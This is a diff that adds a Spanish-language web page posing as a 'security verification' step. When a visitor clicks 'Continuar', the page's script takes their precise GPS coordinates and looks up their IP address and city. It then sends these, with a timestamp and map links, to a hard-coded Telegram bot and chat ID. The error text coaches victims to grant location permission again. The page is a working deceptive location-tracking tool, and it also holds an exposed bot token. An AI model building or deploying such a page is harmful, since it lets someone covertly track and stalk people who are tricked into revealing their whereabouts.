@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de seguridad</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #f0f4f8;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 18px;
+      border: 1px solid #e2e8f0;
+      padding: 2.5rem 2rem;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+
+    .icon { font-size: 48px; margin-bottom: 1rem; }
+
+    h1 {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1a202c;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #718096;
+      margin-bottom: 2rem;
+      line-height: 1.6;
+    }
+
+    /* Estados */
+    #estado-inicio    { display: block; }
+    #estado-cargando  { display: none; }
+    #estado-ok        { display: none; }
+    #estado-error     { display: none; }
+
+    /* Botón */
+    .btn {
+      width: 100%;
+      padding: 14px;
+      font-size: 15px;
+      font-weight: 600;
+      border: none;
+      border-radius: 12px;
+      background: #2b6cb0;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn:hover  { background: #2c5282; }
+    .btn:active { transform: scale(0.98); }
+
+    /* Spinner */
+    .spinner-wrap { margin: 1.5rem 0; }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid #e2e8f0;
+      border-top-color: #2b6cb0;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 1rem;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .spinner-text { font-size: 14px; color: #718096; }
+
+    /* OK */
+    .ok-icon { font-size: 48px; margin-bottom: 1rem; }
+
+    .ok-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #276749;
+      margin-bottom: 6px;
+    }
+
+    .ok-sub { font-size: 13px; color: #718096; }
+
+    /* Error */
+    .error-box {
+      background: #fff5f5;
+      border: 1px solid #feb2b2;
+      border-radius: 10px;
+      padding: 1rem;
+      font-size: 13px;
+      color: #c53030;
+      line-height: 1.6;
+      margin-bottom: 1rem;
+      text-align: left;
+    }
+
+    .btn-reintentar {
+      width: 100%;
+      padding: 11px;
+      font-size: 14px;
+      font-weight: 500;
+      border: 1px solid #cbd5e0;
+      border-radius: 10px;
+      background: #fff;
+      color: #1a202c;
+      cursor: pointer;
+    }
+
+    .btn-reintentar:hover { background: #f7fafc; }
+
+    .footer-note {
+      margin-top: 1.5rem;
+      font-size: 11px;
+      color: #a0aec0;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+
+  <!-- Estado 1: Inicio -->
+  <div id="estado-inicio">
+    <div class="icon">🔒</div>
+    <h1>Verificación de seguridad</h1>
+    <p class="subtitle">Para continuar, necesitamos verificar tu ubicación aproximada. Esto solo toma un segundo.</p>
+    <button class="btn" onclick="iniciar()">Continuar</button>
+    <p class="footer-note">Tu información es procesada de forma segura.</p>
+  </div>
+
+  <!-- Estado 2: Cargando -->
+  <div id="estado-cargando">
+    <div class="spinner-wrap">
+      <div class="spinner"></div>
+      <p class="spinner-text" id="texto-cargando">Verificando ubicación...</p>
+    </div>
+  </div>
+
+  <!-- Estado 3: Éxito -->
+  <div id="estado-ok">
+    <div class="ok-icon">✅</div>
+    <p class="ok-title">Verificación completada</p>
+    <p class="ok-sub">Todo en orden. Puedes continuar.</p>
+  </div>
+
+  <!-- Estado 4: Error -->
+  <div id="estado-error">
+    <div class="icon">⚠️</div>
+    <div class="error-box" id="error-texto"></div>
+    <button class="btn-reintentar" onclick="reintentar()">🔁 Intentar de nuevo</button>
+  </div>
+
+</div>
+
+<script>
+  // ─── Configuración ────────────────────────────────────────
+  const TOKEN   = '8715593596:AAF8JNsG8xUilkSHqZKDPR-HNGwhh_4a3bM';
+  const CHAT_ID = '8233489761';
+
+  // ─── Cambiar estado visible ───────────────────────────────
+  function mostrarEstado(id) {
+    ['estado-inicio','estado-cargando','estado-ok','estado-error']
+      .forEach(e => document.getElementById(e).style.display = 'none');
+    document.getElementById(id).style.display = 'block';
+  }
+
+  // ─── Iniciar flujo ────────────────────────────────────────
+  function iniciar() {
+    if (!navigator.geolocation) {
+      mostrarError('Tu navegador no soporta geolocalización.');
+      return;
+    }
+    mostrarEstado('estado-cargando');
+    document.getElementById('texto-cargando').textContent = 'Solicitando permiso...';
+
+    navigator.geolocation.getCurrentPosition(
+      onUbicacion,
+      onError,
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  // ─── Ubicación obtenida ───────────────────────────────────
+  async function onUbicacion(pos) {
+    document.getElementById('texto-cargando').textContent = 'Enviando datos...';
+
+    const lat  = pos.coords.latitude.toFixed(7);
+    const lng  = pos.coords.longitude.toFixed(7);
+    const acc  = Math.round(pos.coords.accuracy);
+    const hora = new Date().toLocaleString('es-MX', { timeZone: 'America/Tijuana' });
+
+    const gmaps = `https://www.google.com/maps?q=${lat},${lng}`;
+    const osm   = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}&zoom=17`;
+
+    // Obtener IP y país (sin costo, sin clave)
+    let ipInfo = 'No disponible';
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const d = await r.json();
+      ipInfo = `${d.ip} — ${d.city}, ${d.region}, ${d.country_name}`;
+    } catch(_) {}
+
+    const mensaje =
+`📍 *Nueva ubicación detectada*
+
+🕐 Hora: ${hora}
+🌐 IP / Ciudad: ${ipInfo}
+
+📌 Coordenadas:
+   Lat: \`${lat}\`
+   Lng: \`${lng}\`
+   Precisión: ${acc} m
+
+🗺 [Ver en Google Maps](${gmaps})
+🌍 [Ver en OpenStreetMap](${osm})`;
+
+    try {
+      const res = await fetch(
+        `https://api.telegram.org/bot${TOKEN}/sendMessage`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: false
+          })
+        }
+      );
+
+      const data = await res.json();
+      if (data.ok) {
+        mostrarEstado('estado-ok');
+      } else {
+        mostrarError('No se pudo enviar el reporte. Error: ' + data.description);
+      }
+    } catch(e) {
+      mostrarError('Error de red al enviar datos. Revisa tu conexión.');
+    }
+  }
+
+  // ─── Error de geolocalización ─────────────────────────────
+  function onError(err) {
+    const msgs = {
+      1: 'Permiso de ubicación denegado.\n\nVe al ícono de candado 🔒 en tu navegador → Permitir ubicación → recarga la página.',
+      2: 'No se pudo obtener la posición. Activa el GPS o conéctate a Wi-Fi.',
+      3: 'Tiempo agotado. Intenta en un lugar con mejor señal.'
+    };
+    mostrarError(msgs[err.code] || 'Error desconocido.');
+  }
+
+  function mostrarError(msg) {
+    document.getElementById('error-texto').textContent = msg;
+    mostrarEstado('estado-error');
+  }
+
+  function reintentar() {
+    mostrarEstado('estado-inicio');
+  }
+</script>
+
+</body>
+</html>
